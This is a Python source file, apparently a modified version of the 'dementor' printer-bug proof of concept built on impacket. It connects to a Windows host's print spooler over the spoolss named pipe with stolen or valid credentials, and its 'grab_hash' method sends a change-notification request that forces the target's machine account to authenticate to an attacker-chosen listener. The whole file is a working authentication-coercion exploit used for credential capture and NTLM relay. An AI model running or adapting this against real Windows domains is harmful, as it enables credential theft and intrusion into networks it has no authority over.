# originally by 3xocyte, modified by agsolino after native MS-RPRN functionality was added to impacket
# abuse cases and better implementation from the original discoverer: https://github.com/leechristensen/SpoolSample
# some code from https://www.exploit-db.com/exploits/2879/

import os
import sys
import argparse
import binascii
import configparser
import logging
from time import sleep
from threading import Thread
from impacket import smbserver, smb
from impacket.dcerpc.v5 import transport, rprn
from impacket.structure import Structure
from impacket.uuid import uuidtup_to_bin
from impacket.examples import logger

class Dementor():
    def __init__(self,domain,user,password,nthash,target,listener):
        self.domain = domain
        self.user = user
        self.password = password
        self.nthash = nthash
        self.target = target
        self.listener = listener


    def call_open_printer(self, dce):

        global debug
        debug = False
        logging.info("getting context handle...")
        try:
            resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % self.target)
            if debug == True:
                logging.debug("raw response: ")
                resp.dump()
                logging.debug("handle is: %s" % binascii.hexlify(resp['pHandle']))
        except Exception as e:
            logging.error("exception " + str(e))
            dce.disconnect()
            sys.exit()
        return resp['pHandle']

    def grab_hash(self, dce, handle, listener):
        global debug
        logging.info("sending RFFPCNEX...")
        try:
            resp = rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(dce, handle, rprn.PRINTER_CHANGE_ADD_JOB,
                                                               pszLocalMachine='\\\\%s\x00' % listener)
            if debug is True:
                logging.info("raw response: ")
                resp.dump()
        except Exception as e:
            if str(e).find('RPC_S_SERVER_UNAVAILABLE') >= 0:
                logging.info('Got expected RPC_S_SERVER_UNAVAILABLE exception. Attack worked')
                pass
            else:
                logging.error("exception %s" % str(e))

    def create_connection(self, domain, username, password, ntlm):
        # set up connection prereqs
        # creds	
        creds={}
        creds['username'] = username
        creds['password'] = password
        creds['domain'] = domain
        creds['nthash'] = ntlm
        # to transport
        stringBinding = r'ncacn_np:%s[\pipe\spoolss]' % self.target
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(creds['username'], creds['password'], creds['domain'], nthash = creds['nthash'])
            dce = rpctransport.get_dce_rpc()
        # actually connect
        logging.info("connecting to %s" % self.target)
        try:
            dce.connect()
        except Exception as e:
            if "STATUS_ACCESS_DENIED" in str(e):
                logging.error("access denied")
                sys.exit()
            else:
                logging.error("unhandled exception occured: %s" % str(e))
                sys.exit()
        # defines the printer endpoint
        try:
            dce.bind(rprn.MSRPC_UUID_RPRN)
        except Exception as e:
            logging.error("unhandled exception: %s" % str(e))
            sys.exit()
        logging.info("bound to spoolss")
        return dce

    def main(self):

        # globals
        #global target
        #global listener
        #global debug
        #global show_banner

 #       parser = argparse.ArgumentParser(add_help = True, description = "dementor - rough PoC to connect to spoolss to elicit machine account authentication (implementation by @3xocyte, idea/discovery by @tifkin_, rediscovery and code fixes by @elad_shamir)")
  #      parser.add_argument('-u', '--username', action="store", default='', help='valid username')
   #     parser.add_argument('-p', '--password', action="store", default='', help='valid password')
    #    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
     #   parser.add_argument('--ntlm', action="store", default='', help='nt hash')
      #  parser.add_argument('--server', action='store_true', default=False, help='create smb listener')
       # parser.add_argument('--debug', action="store_true", default=False, help='enable debugging')
        #parser.add_argument('-q', '--banner', action="store_true", default=False,help='show banner')
#        parser.add_argument('listener', help='ip address or hostname of listener')
 #       parser.add_argument('target', help='ip address or hostname of target')

  #      options = parser.parse_args()

#        self.domain = domain
#        self.username = username
#        self.password = password
#        self.ntlm = ntlm
#        self.server = server
#        self.listener = listener
#        self.target = target
#        self.debug = debug
 #       self.banner = banner

#        if banner is True:
 #           print(show_banner)

  #      if server is True:
  #          logging.info("starting smb server...")
  #          server_thread = SMBServer()
  #          server_thread.daemon = True
  #          server_thread.start()
  #          sleep(1) # ensure server starts before continuing
  #          logging.info("server running")

        dce = self.create_connection(self.domain, self.user, self.password, self.nthash)
        handle = self.call_open_printer(dce)
        self.grab_hash(dce, handle, self.listener)
        logging.info("done!")
        dce.disconnect()
        return

#if __name__ == '__main__':
#    main()
